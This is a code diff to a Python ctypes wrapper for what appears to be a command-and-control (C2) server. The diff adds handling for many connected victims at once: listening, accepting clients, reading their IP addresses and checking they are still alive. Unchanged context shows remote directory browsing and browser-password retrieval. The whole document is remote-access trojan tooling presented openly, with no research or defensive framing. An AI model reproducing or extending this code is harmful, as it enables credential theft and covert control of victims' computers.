@@ -19,9 +19,6 @@ class C2Wrapper:
         
         # Socket file descriptor
         self.client_fd: Optional[int] = None
-
-        # ipv4 for later use
-        self.ipv4 = None
     
     def _setup_function_signatures(self):
         """Configure ctypes function signatures"""
@@ -75,6 +72,26 @@ class C2Wrapper:
         # char* browse_dir_handle(sock_t client_fd, char* dir)
         self.lib.browse_dir_handle.argtypes = [c_int, c_char_p]
         self.lib.browse_dir_handle.restype = c_void_p
+
+        # Multi-client APIs
+        # int start_listen()
+        self.lib.start_listen.argtypes = []
+        self.lib.start_listen.restype = c_int
+
+        # int accept_client()
+        self.lib.accept_client.argtypes = []
+        self.lib.accept_client.restype = c_int
+
+        # char* get_peer_ip(int fd)
+        self.lib.get_peer_ip.argtypes = [c_int]
+        self.lib.get_peer_ip.restype = c_void_p
+
+        # void stop_listen_and_cleanup()
+        self.lib.stop_listen_and_cleanup.argtypes = []
+        self.lib.stop_listen_and_cleanup.restype = None
+        # int client_is_alive(int fd)
+        self.lib.client_is_alive.argtypes = [c_int]
+        self.lib.client_is_alive.restype = c_int
     
     def _free_cstring(self, ptr: int):
         """Free memory allocated by C code"""
@@ -88,14 +105,49 @@ class C2Wrapper:
         Returns:
             Client socket file descriptor
         """
-        self.client_fd = self.lib.sock_setup()
-        return self.client_fd
+        # Start listening in background (non-blocking) for multiple clients
+        res = self.lib.start_listen()
+        if res != 0:
+            raise RuntimeError("Failed to start listening socket")
+        return 0
+
+    def stop_listen(self):
+        """Stop listening and cleanup all clients"""
+        self.lib.stop_listen_and_cleanup()
+
+    def accept_client(self) -> int:
+        """Block until a client connects and return its fd, or -1 on error."""
+        fd = self.lib.accept_client()
+        return int(fd)
+
+    def get_peer_ip(self, client_fd: int) -> str:
+        """Return peer IP for a client fd (caller should not free; wrapper frees the C pointer)."""
+        ptr = self.lib.get_peer_ip(int(client_fd))
+        if not ptr:
+            return ""
+        s = ctypes.string_at(ptr).decode('utf-8', errors='replace')
+        self._free_cstring(ptr)
+        return s
+
+    def client_is_alive(self, client_fd: int) -> bool:
+        try:
+            r = int(self.lib.client_is_alive(int(client_fd)))
+            return r == 1
+        except Exception:
+            return False
     
     def cleanup(self):
         """Clean up and close the connection"""
         if self.client_fd is not None:
             self.lib.cleanup(self.client_fd)
             self.client_fd = None
+
+    def close_client(self, fd: int):
+        """Close a client socket by fd"""
+        try:
+            self.lib.cleanup(int(fd))
+        except Exception:
+            pass
     
     def get_client_info(self) -> str:
         """
@@ -104,8 +156,6 @@ class C2Wrapper:
         Returns:
             Client info string
         """
-        if self.client_fd is None:
-            raise RuntimeError("Client not connected. Call setup() first.")
         
         ptr = self.lib.client_info(self.client_fd)
         if not ptr:
@@ -114,10 +164,6 @@ class C2Wrapper:
         # Convert C string to Python string
         result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
         self._free_cstring(ptr)
-        # Get ipv4
-        for line in result.splitlines():
-            if line.startswith("Public IP"):
-                self.ipv4 = line.split(":", 1)[1].strip()
         return result
     
     def get_browser_password(self) -> str:
